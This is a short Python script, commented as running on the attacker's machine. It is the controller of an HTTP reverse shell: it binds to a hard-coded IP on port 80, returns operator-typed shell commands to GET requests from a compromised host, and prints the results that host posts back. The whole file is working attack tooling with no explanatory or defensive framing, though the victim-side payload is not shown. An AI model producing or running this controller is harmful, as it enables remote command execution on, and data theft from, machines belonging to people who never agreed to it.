# This server runs on the attacker's machine

from http.server import BaseHTTPRequestHandler
from http.server import HTTPServer

HOST_NAME = '172.31.98.43'
PORT_NUMBER = 80

class Server(BaseHTTPRequestHandler):


    def do_GET(self):
        command = input('Shell> ')
        self.send_response(200)
        self.send_header('Content_type', 'text/html')
        self.end_headers()
        self.wfile.write(str.encode(command))


    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        postVar = self.rfile.read(length)
        print(postVar)


if __name__ == '__main__':
    httpd = HTTPServer((HOST_NAME, PORT_NUMBER), Server)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[!] Server is terminated')
